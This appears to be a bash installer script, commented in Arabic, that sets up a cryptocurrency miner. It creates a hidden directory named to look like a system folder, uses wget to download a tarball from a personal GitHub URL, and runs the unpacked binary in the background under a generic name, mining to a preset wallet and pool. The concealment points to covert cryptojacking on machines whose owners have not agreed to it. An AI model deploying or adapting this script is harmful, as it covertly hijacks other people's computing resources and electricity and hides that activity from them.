#!/bin/bash

# إعداد بيانات المحفظة والمسبح
WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"   # ← عدّلها لمحفظتك
WORKER="x" 
POOL="ghostrider.eu.mine.zergpool.com:5354"
ALGORITHM="ghostrider"
THREADS=1   # ← عدد الأنوية المحدد للتعدين (1 Core)

# مجلد عمل مخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل SRBMiner-MULTI (Linux x64)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

# فك الضغط في المجلد المخفي
tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

# تشغيل المعدّن في الخلفية بنواة واحدة
nohup ./scala \ 
  --algorithm ghostrider \
  --pool $POOL \
  --wallet $WALLET \
  --password c=XMR \
  --cpu-threads-limit $THREADS \
  > cpu_output.log 2>&1 &
